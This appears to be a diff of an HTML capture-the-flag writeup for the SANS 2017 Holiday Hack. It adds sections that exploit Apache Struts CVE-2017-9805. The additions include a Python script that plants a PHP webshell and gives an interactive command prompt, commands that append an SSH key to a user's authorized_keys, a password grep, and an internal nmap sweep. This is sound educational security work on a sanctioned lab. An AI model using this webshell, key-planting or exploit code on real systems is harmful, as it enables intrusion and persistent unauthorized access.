@@ -6,7 +6,7 @@
 <title>SANS 2017 Holiday Hack Writeup</title>
 <meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta  name="generator" content="Org-mode" />
-<meta  name="author" content="Vlad Grigorescu" />
+<meta  name="author" content="NCSA Security Team" />
 <style type="text/css">
  <!--/*--><![CDATA[/*><!--*/
   .title  { text-align: center; }
@@ -190,11 +190,7 @@ for the JavaScript code in this tag.
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#sec-1"><span class="todo TODO">TODO</span> Introduction</a>
-<ul>
-<li><a href="#sec-1-1"><span class="todo TODO">TODO</span> Add more content here</a></li>
-</ul>
-</li>
+<li><a href="#sec-1">Introduction</a></li>
 <li><a href="#sec-2">tl;dr: Quick Answers</a></li>
 <li><a href="#sec-3">Pre-contest Reconnaissance</a>
 <ul>
@@ -202,7 +198,7 @@ for the JavaScript code in this tag.
 <li><a href="#sec-3-2">DNS Brute Forcing</a></li>
 <li><a href="#sec-3-3">Certificate Transparency Logs</a></li>
 <li><a href="#sec-3-4">Monitoring</a></li>
-<li><a href="#sec-3-5"><span class="todo TODO">TODO</span> Things changed at some point</a></li>
+<li><a href="#sec-3-5">And Then Things Changed&#x2026;</a></li>
 <li><a href="#sec-3-6">Recon Summary</a></li>
 </ul>
 </li>
@@ -238,18 +234,13 @@ for the JavaScript code in this tag.
 <li><a href="#sec-6-3">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
 </ul>
 </li>
-<li><a href="#sec-7"><span class="todo TODO">TODO</span> Misc</a>
-<ul>
-<li><a href="#sec-7-1">Let the Hack Begin!</a></li>
-<li><a href="#sec-7-2">Using ripgrep</a></li>
-</ul>
-</li>
+<li><a href="#sec-7"><span class="todo TODO">TODO</span> Misc</a></li>
 </ul>
 </div>
 </div>
 
 <div id="outline-container-sec-1" class="outline-2">
-<h2 id="sec-1"><span class="todo TODO">TODO</span> Introduction</h2>
+<h2 id="sec-1">Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 We're the Security team at the National Center for Supercomputing
@@ -274,15 +265,17 @@ services, while being as transparent as possible to end-users?
 As we do red-team work, it's useful to try to think like a defender:
 "How would <b>I</b> have secured this system, and are there any ways around
 that?" Similarly, as we do blue-team work, we need to know the methods
-and tools that an attacker would use. With that in mind, our approach
-to this year's Holiday Hack is to solve the challenges, but also to
-try to offer some insight into Alabaster Snowball's defenses. Where
-possible, we offer some alternatives that he could've used which
-would've been more secure.
+and tools that an attacker would use.
 </p>
-</div>
-<div id="outline-container-sec-1-1" class="outline-3">
-<h3 id="sec-1-1"><span class="todo TODO">TODO</span> Add more content here</h3>
+
+<p>
+Our approach for this year's Holiday Hack was to stick as closely as
+possible to the hints, blog posts, and tools provided. &#x2026;and then to
+try to elevate privileges, crack passwords, and see what other
+information we could find, all while taking care to stay within the
+scope of the challenge. We also tried to automate as much of our work
+as possible, and we make these tools publicly available.
+</p>
 </div>
 </div>
 <div id="outline-container-sec-2" class="outline-2">
@@ -741,8 +734,20 @@ ground running.
 </div>
 
 <div id="outline-container-sec-3-5" class="outline-3">
-<h3 id="sec-3-5"><span class="todo TODO">TODO</span> Things changed at some point</h3>
+<h3 id="sec-3-5">And Then Things Changed&#x2026;</h3>
+<div class="outline-text-3" id="text-3-5">
+<p>
+On December 11th, this setup was changed, and a lot of hosts were
+removed from DNS. We believe that the systems were reconfigured to
+only be accessible from private IP space.
+</p>
+
+<p>
+The systems where the configuration changed are marked in italics in the table below.
+</p>
 </div>
+</div>
+
 <div id="outline-container-sec-3-6" class="outline-3">
 <h3 id="sec-3-6">Recon Summary</h3>
 <div class="outline-text-3" id="text-3-6">
@@ -787,13 +792,13 @@ We can use the following indicators to search any clues we're later provided wit
 </tr>
 
 <tr>
-<td class="left">intranet.northpolechristmastown.com</td>
+<td class="left"><i>intranet.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="left">files.northpolechristmastown.com</td>
+<td class="left"><i>files.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
@@ -805,25 +810,25 @@ We can use the following indicators to search any clues we're later provided wit
 </tr>
 
 <tr>
-<td class="left">admin.northpolechristmastown.com</td>
+<td class="left"><i>admin.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="left">mail.northpolechristmastown.com</td>
+<td class="left"><i>mail.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="left">emi.northpolechristmastown.com</td>
+<td class="left"><i>emi.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="left">ewa.northpolechristmastown.com</td>
+<td class="left"><i>ewa.northpolechristmastown.com</i></td>
 <td class="left">FQDN</td>
 <td class="left">DNS Brute Force</td>
 </tr>
@@ -946,6 +951,7 @@ We can use the following indicators to search any clues we're later provided wit
 </div>
 </div>
 </div>
+
 
 <div id="outline-container-sec-4" class="outline-2">
 <h2 id="sec-4">Terminals</h2>
@@ -3231,7 +3237,9 @@ This challenge was primarily to get players introduced to the game aspect of the
 <div id="outline-container-sec-5-2" class="outline-3">
 <h3 id="sec-5-2"><span class="todo TODO">TODO</span> Question 2</h3>
 <div class="outline-text-3" id="text-5-2">
-</div><ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-2-0-1" name="sec-5-2-0-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+</div><div id="outline-container-question" class="outline-4">
+<h4 id="question"><a id="sec-5-2-1" name="sec-5-2-1"></a>Question</h4>
+<div class="outline-text-4" id="text-question">
 
 <p>
 Investigate the Letters to Santa application at
@@ -3240,9 +3248,11 @@ Great Book page available in the web root of the server? What is
 Alabaster Snowball's password?
 </p>
 </div>
-</li>
+</div>
 
-<li><a id="background-information" name="background-information"></a><a id="sec-5-2-0-2" name="sec-5-2-0-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+<div id="outline-container-background-information" class="outline-4">
+<h4 id="background-information"><a id="sec-5-2-2" name="sec-5-2-2"></a>Background Information</h4>
+<div class="outline-text-4" id="text-background-information">
 
 <p>
 We know that there is an application on <code>https://l2s.northpolechristmastown.com</code> that we need to investigate.
@@ -3286,9 +3296,11 @@ The following SANS Pentest Blog posts were also very helpful for this challenge:
 </li>
 </ul>
 </div>
-</li>
+</div>
 
-<li><a id="goal" name="goal"></a><a id="sec-5-2-0-3" name="sec-5-2-0-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+<div id="outline-container-goal" class="outline-4">
+<h4 id="goal"><a id="sec-5-2-3" name="sec-5-2-3"></a>Goal</h4>
+<div class="outline-text-4" id="text-goal">
 
 <p>
 There are two goals for this challenge. The first is to determine the topic of
@@ -3296,9 +3308,11 @@ the Great Book Page that is sitting on the web root of this server. The second
 is to determine what Alabaster's password is.
 </p>
 </div>
-</li>
+</div>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-2-0-4" name="sec-5-2-0-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<div id="outline-container-approach" class="outline-4">
+<h4 id="approach"><a id="sec-5-2-4" name="sec-5-2-4"></a>Approach</h4>
+<div class="outline-text-4" id="text-approach">
 
 <p>
 According to the second hint there might be development code left in the production code.
@@ -3348,7 +3362,9 @@ Nmap done: 1 IP address (1 host up) scanned<span style="font-weight: bold;"> in<
 </div>
 
 <p>
-There appears to be another name on the certificate of the host. Let's let nmap's scripts scan that as well.
+In addition to the hidden link for dev.northpolechristmastown.com, it is also
+present as an alternate name on the certificate of the host. Let's let nmap's
+scripts scan that as well.
 </p>
 
 <div class="org-src-container">
@@ -3458,7 +3474,7 @@ vmlinuz.old
 <p>
 It looks like we've been dropped into the root directory. Let's look for
 where the web root is. Normally, the default is /var/www/html on most
-linux+apache based hosts. We'll try again with the command <code>ls -al /var/ww/html</code>.
+linux+apache based hosts. We'll try again with the command <code>ls -al /var/www/html</code>.
 </p>
 
 <div class="org-src-container">
@@ -3477,7 +3493,24 @@ drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
 </div>
 
 <p>
-Oh look. There's <a href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">GreatBookPage2.pdf</a>. We can download it and find the answer to the first question. Now on to the second.
+Oh look. There's <a href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">GreatBookPage2.pdf</a>. We can download it and find the answer to the first question.
+</p>
+
+<p>
+Let's assume for a minute that we didn't know where the web root
+was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
+that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using <code>find</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">$ find / -name *.pdf
+/var/www/html/GreatBookPage2.pdf
+</pre>
+</div>
+
+<p>
+Now on to the second.
 </p>
 
 <p>
@@ -3504,7 +3537,7 @@ Let's run <code>find</code> to see if we can find the password in our webshell.
 
 <div class="org-src-container">
 
-<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null |xargs grep password
+<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null | xargs grep password
 </pre>
 </div>
 
@@ -3514,7 +3547,7 @@ Within the page full of results we see this:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+<pre class="src src-sh">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
 </pre>
 </div>
 
@@ -3524,58 +3557,436 @@ A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomca
 
 <div class="org-src-container">
 
-<pre class="src src-sh">final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
-final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+<pre class="src src-java"><span style="font-weight: bold;">final</span> <span style="font-weight: bold; text-decoration: underline;">String</span> <span style="font-weight: bold; font-style: italic;">username</span> = <span style="font-style: italic;">"alabaster_snowball"</span>;
+<span style="font-weight: bold;">final</span> <span style="font-weight: bold; text-decoration: underline;">String</span> <span style="font-weight: bold; font-style: italic;">password</span> = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-solution" class="outline-4">
+<h4 id="solution"><a id="sec-5-2-5" name="sec-5-2-5"></a>Solution</h4>
+<div class="outline-text-4" id="text-solution">
+</div>
+
+<ul class="org-ul"><li><a id="sec-5-2-5-1" name="sec-5-2-5-1"></a>What is the topic of The Great Book page available in the web root of the server?<br  /><div class="outline-text-5" id="text-5-2-5-1">
+<p>
+Leveraging the Apache Struts vulnerability, we can run <code>ls</code> on the common web root of <code>/var/www/html</code>, and get the filename of the page, then download it via the web server. Opening it up, we see that the topic is:
+</p>
+
+<blockquote>
+<p>
+On the Topic of Flying Animals
+</p>
+</blockquote>
+</div>
+</li>
+
+<li><a id="sec-5-2-5-2" name="sec-5-2-5-2"></a>What is Alabaster Snowball’s password?<br  /><div class="outline-text-5" id="text-5-2-5-2">
+<p>
+The trick here is just finding the right file, and the password is in cleartext in that file. We used <code>find</code> to <code>grep</code> all the files for "password".
+</p>
+
+<blockquote>
+<p>
+<code>stream_unhappy_buy_loss</code>
+</p>
+</blockquote>
+</div>
+</li></ul>
+</div>
+
+<div id="outline-container-alternatives" class="outline-4">
+<h4 id="alternatives"><a id="sec-5-2-6" name="sec-5-2-6"></a>Alternatives</h4>
+<div class="outline-text-4" id="text-alternatives">
+</div>
+
+<ul class="org-ul"><li><a id="sec-5-2-6-1" name="sec-5-2-6-1"></a>Add an authorized_key<br  /><div class="outline-text-5" id="text-5-2-6-1">
+<p>
+One thing you can do if you don't have the password yet is actually
+add an ssh key to alabaster's authorized keys file. This is
+problematic since you need to know that the username is actually
+<code>alabaster_snowball</code> first. Assuming you do, you can run the following
+command to add your key to the file.
+</p>
+
+<p>
+The command we want to run is the following, taking care not to clobber any existing authorized keys:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh"><span style="font-weight: bold;">cd</span> /home/alabaster_snowball
+<span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">Make the .ssh directory, if it doesn't exist</span>
+mkdir .ssh
+<span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">ssh is very picky about permissions, so lock this down:</span>
+chmod 700 .ssh
+<span style="font-weight: bold;">cd</span> .ssh
+
+<span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">Create the authorized_keys file, if it doesn't exist</span>
+touch authorized_keys
+<span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">...and lock it down</span>
+chmod 600 authorized_keys
+
+<span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">Append our key</span>
+<span style="font-weight: bold;">echo</span> ssh-rsa <span style="font-weight: bold; font-style: italic;">VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo</span>= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys
+</pre>
+</div>
+
+<p>
+For running this via the Struts exploit, we want this all as a
+one-liner. Let's break this up into two parts: first, we'll create the
+necessary directory and file, and ensure the permissions are correct,
+then we'll add our key:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'</span>
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'</span>
+</pre>
+</div>
+
+<p>
+Then you can ssh using your private key identity file.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
+alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+</pre>
+</div>
+
+<p>
+Once in you are in a restricted shell but you can try to grep for alabaster's password but a regular grep against the entire system will take about 1 minute then you have to parse through the results.
+</p>
+</div>
+</li>
+
+<li><a id="sec-5-2-6-2" name="sec-5-2-6-2"></a>Automate the webshell<br  /><div class="outline-text-5" id="text-5-2-6-2">
+<p>
+We can automate dropping a webshell and creating a mini shell to query it. Assuming we have <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a> in the same directory we can create a script to automate exploitation and give us a prompt to execute commands.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">!/usr/bin/env python</span>
+<span style="font-weight: bold;">from</span> __future__ <span style="font-weight: bold;">import</span> print_function
+
+<span style="font-weight: bold;">import</span> base64
+<span style="font-weight: bold;">import</span> requests
+<span style="font-weight: bold;">import</span> sys
+
+<span style="font-weight: bold;">from</span> cve_2017_9805 <span style="font-weight: bold;">import</span> main <span style="font-weight: bold;">as</span> struts_exploit
+
+<span style="font-weight: bold; font-style: italic;">VULNERABLE_ENDPOINT</span> = <span style="font-style: italic;">"https://dev.northpolechristmastown.com/orders.xhtml"</span>
+<span style="font-weight: bold; font-style: italic;">BASE_URL</span> = <span style="font-style: italic;">"https://l2s.northpolechristmastown.com/"</span>
+<span style="font-weight: bold; font-style: italic;">WEBSHELL</span> = <span style="font-style: italic;">"4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"</span>
+<span style="font-weight: bold; font-style: italic;">WEBSHELL_PAYLOAD</span> = b<span style="font-style: italic;">'&lt;?php system($_GET[cmd]); ?&gt;\n'</span>
+<span style="font-weight: bold; font-style: italic;">WEBSHELL_PAYLOAD_ENCODED</span> = base64.encodestring(WEBSHELL_PAYLOAD).strip()
+
+<span style="font-weight: bold; font-style: italic;">## </span><span style="font-weight: bold; font-style: italic;">Emulate this command:</span>
+<span style="font-weight: bold; font-style: italic;">## </span><span style="font-weight: bold; font-style: italic;">/cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | </span>
+<span style="font-weight: bold; font-style: italic;">##    </span><span style="font-weight: bold; font-style: italic;">base64 -d &gt; /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml</span>
+<span style="font-weight: bold; font-style: italic;">EXPLOIT_COMMAND</span> = <span style="font-style: italic;">"echo {} | base64 -d &gt; /var/www/html/{}"</span>.<span style="font-weight: bold;">format</span>(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">run_command</span>(command):
+    <span style="font-weight: bold; font-style: italic;">url</span> = BASE_URL + WEBSHELL
+    <span style="font-weight: bold; font-style: italic;">request</span> = requests.get(url, params={<span style="font-style: italic;">"cmd"</span>:command})
+    <span style="font-weight: bold;">if</span> request.status_code == 404:
+        <span style="font-weight: bold;">return</span> <span style="font-weight: bold; text-decoration: underline;">None</span>
+    <span style="font-weight: bold;">return</span> request.text
+
+<span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">Main function</span>
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">setup</span>():
+    <span style="font-weight: bold; font-style: italic;"># </span><span style="font-weight: bold; font-style: italic;">See if we can run the id command, and if so, we are good to go...</span>
+    <span style="font-weight: bold; font-style: italic;">out</span> = run_command(<span style="font-style: italic;">'id'</span>)
+    <span style="font-weight: bold;">if</span> out <span style="font-weight: bold;">and</span> <span style="font-style: italic;">'uid='</span> <span style="font-weight: bold;">in</span> out:
+        <span style="font-weight: bold;">return</span> <span style="font-weight: bold; text-decoration: underline;">True</span>
+    sys.stderr.write(<span style="font-style: italic;">"The webshell did not exist, re-exploiting.....\n"</span>)
+    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
+    <span style="font-weight: bold; font-style: italic;">out</span> = run_command(<span style="font-style: italic;">'id'</span>)
+    <span style="font-weight: bold;">if</span> out <span style="font-weight: bold;">and</span> <span style="font-style: italic;">'uid='</span> <span style="font-weight: bold;">in</span> out:
+        <span style="font-weight: bold;">return</span> <span style="font-weight: bold; text-decoration: underline;">True</span>
+    sys.stderr.write(<span style="font-style: italic;">"The struts exploit/webshell failed :-(\n"</span>)
+    sys.<span style="font-weight: bold; text-decoration: underline;">exit</span>(1)
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">interactive</span>():
+    setup()
+    <span style="font-weight: bold;">while</span> <span style="font-weight: bold; text-decoration: underline;">True</span>:
+        <span style="font-weight: bold;">try</span>:
+            <span style="font-weight: bold; font-style: italic;">cmd</span> = <span style="font-weight: bold;">raw_input</span>(<span style="font-style: italic;">"www-data@l2s:$ "</span>)
+        <span style="font-weight: bold;">except</span> <span style="font-weight: bold; text-decoration: underline;">EOFError</span>:
+            <span style="font-weight: bold;">print</span>()
+            <span style="font-weight: bold;">return</span>
+        <span style="font-weight: bold;">print</span>(run_command(cmd))
+
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">one_shot</span>(command):
+    setup()
+    <span style="font-weight: bold;">print</span>(run_command(command))
+
+<span style="font-weight: bold;">if</span> <span style="font-weight: bold;">__name__</span> == <span style="font-style: italic;">"__main__"</span>:
+    <span style="font-weight: bold;">if</span> sys.argv[1:]:
+        one_shot(<span style="font-style: italic;">' '</span>.join(sys.argv[1:]))
+    <span style="font-weight: bold;">else</span>:
+        interactive()
+</pre>
+</div>
+
+<p>
+First we need to either rename <code>cve-2017-9805.py</code> to <code>cve_2017_9805.py</code> or create a symlink so it can be properly imported into our script. Then we can easily execute commands on l2s.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">holiday@hack:~$ ./l2s.py id
+The webshell did not exist, re-exploiting.....
+[+] Encoding Command
+[+] Building XML object
+[+] Placing command<span style="font-weight: bold;"> in</span> XML object
+[+] Converting Back to String
+[+] Making Post Request with our payload
+[+] Payload executed
+<span style="font-weight: bold; font-style: italic;">uid</span>=33(www-data) <span style="font-weight: bold; font-style: italic;">gid</span>=33(www-data) <span style="font-weight: bold; font-style: italic;">groups</span>=33(www-data)
+
+holiday@hack:~$ ./l2s.py uname -a
+Linux hhc17-apache-struts1 4.9.0-5-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux</span>
+
+holiday@hack:~$ ./l2s.py
+www-data@l2s:$ id
+<span style="font-weight: bold; font-style: italic;">uid</span>=33(www-data) <span style="font-weight: bold; font-style: italic;">gid</span>=33(www-data) <span style="font-weight: bold; font-style: italic;">groups</span>=33(www-data)
+
+www-data@l2s:$ uname -a
+Linux hhc17-apache-struts1 4.9.0-5-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux</span>
 </pre>
 </div>
 </div>
 </li>
 
-
-<li><a id="solution" name="solution"></a><a id="sec-5-2-0-5" name="sec-5-2-0-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
-</div>
-
-<ul class="org-ul"><li><a id="sec-5-2-0-5-1" name="sec-5-2-0-5-1"></a>What is the topic of The Great Book page available in the web root of the server?<br  /><div class="outline-text-6" id="text-5-2-0-5-1">
+<li><a id="sec-5-2-6-3" name="sec-5-2-6-3"></a>Search even faster with ripgrep<br  /><div class="outline-text-5" id="text-5-2-6-3">
 <p>
-On the Topic of Flying Animals
+Ripgrep is a super fast grep replacement written in rust. It does a better job at filtering binary files, so we can run this command that finishes in about a second:
 </p>
-</div>
-</li>
 
-<li><a id="sec-5-2-0-5-2" name="sec-5-2-0-5-2"></a>What is Alabaster Snowball’s password?<br  /><div class="outline-text-6" id="text-5-2-0-5-2">
 <p>
-<code>stream_unhappy_buy_loss</code>
+The following steps create a folder for ripgrep and executes the search.
 </p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">www-data@l2s:$ mkdir /tmp/.rg
+www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | tar xzf - -C /tmp/.rg/
+www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+</pre>
+</div>
 </div>
 </li></ul>
-</li>
-
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-2-0-6" name="sec-5-2-0-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 </div>
-</li>
 
-<div id="outline-container-sec-5-2-1" class="outline-4">
-<h4 id="sec-5-2-1"><span class="todo TODO">TODO</span> ripgrep</h4>
-</div>
-<div id="outline-container-sec-5-2-2" class="outline-4">
-<h4 id="sec-5-2-2"><span class="todo TODO">TODO</span> SSH key method</h4>
-<div class="outline-text-4" id="text-5-2-2">
-</div><ul class="org-ul"><li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-2-2-1" name="sec-5-2-2-1"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<div id="outline-container-common-pitfalls" class="outline-4">
+<h4 id="common-pitfalls"><a id="sec-5-2-7" name="sec-5-2-7"></a>Common Pitfalls</h4>
+<div class="outline-text-4" id="text-common-pitfalls">
 
 <p>
-Do we know what issue(s) people were running into?
+A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:
 </p>
-</div>
-</li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-2-2-2" name="sec-5-2-2-2"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<ul class="org-ul">
+<li>Using the <code>/dev/tcp</code> trick like we did,
+</li>
+<li>Redirect the output to <code>/var/www/html/$filename</code>, and then accessing that via the web interface,
+</li>
+<li>Piping the output to <code>netcat</code>.
+</li>
+</ul>
 
 <p>
-How was the challenge setup? Was there a better way to secure this
-system?
+Finding the password was also tricky. Luckily, there weren't many
+files on this system, so we could just <code>grep</code> everything, but another
+option would've been to look for files that had been modified around
+the time the system was installed.
 </p>
 </div>
-</li></ul>
+</div>
+
+<div id="outline-container-about-the-challenge" class="outline-4">
+<h4 id="about-the-challenge"><a id="sec-5-2-8" name="sec-5-2-8"></a>About the Challenge</h4>
+<div class="outline-text-4" id="text-about-the-challenge">
+
+<p>
+Initially the host has a couple of noticeable holes.
+</p>
+
+<ul class="org-ul">
+<li>Apache server running as alabaster (eventually changed to www-data user)
+</li>
+<li>Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)
+</li>
+</ul>
+
+<p>
+The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by Apache struts on a high port being redirected by nginx.
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-5-2-9" class="outline-4">
+<h4 id="sec-5-2-9">Moving Foward</h4>
+<div class="outline-text-4" id="text-5-2-9">
+<p>
+Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">holiday@hack:~$ ./l2s.py <span style="font-style: italic;">"nmap -sC 10.142.0.*"</span>
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 20:51 UTC
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Host is up (0.00018s latency)<span style="font-weight: bold;">.</span>
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+| ssh-hostkey:
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open  http
+|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
+443/tcp  open  https
+|_http-title: Toys List
+| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=dev.northpolechristmastown.com
+| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
+| Not valid before: 2017-11-29T12:54:54
+|_Not valid after:  2018-02-27T12:54:54
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg:
+|_  http/1.1
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Host is up (0.00017s latency)<span style="font-weight: bold;">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-hostkey:
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp open  http
+|_http-title: Toys List
+
+Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+Host is up (0.00018s latency)<span style="font-weight: bold;">.</span>
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+| ssh-hostkey:
+|   2048 a2:c4:67:fe:a2:d9:df:47:02:55:35:1a:f4:1b:b6:02 (RSA)
+|_  256 9e:d4:01:d1:71:be:95:90:68:6e:ee:87:28:42:49:8e (ECDSA)
+25/tcp   open  smtp
+|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, <span style="font-weight: bold; font-style: italic;">AUTH</span>=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+80/tcp   open  http
+| http-robots.txt: 1 disallowed entry
+|_/cookie.txt
+|_http-title: Site doesn<span style="font-style: italic;">'t have a title (text/html; charset=UTF-8).</span>
+<span style="font-style: italic;">143/tcp  open  imap</span>
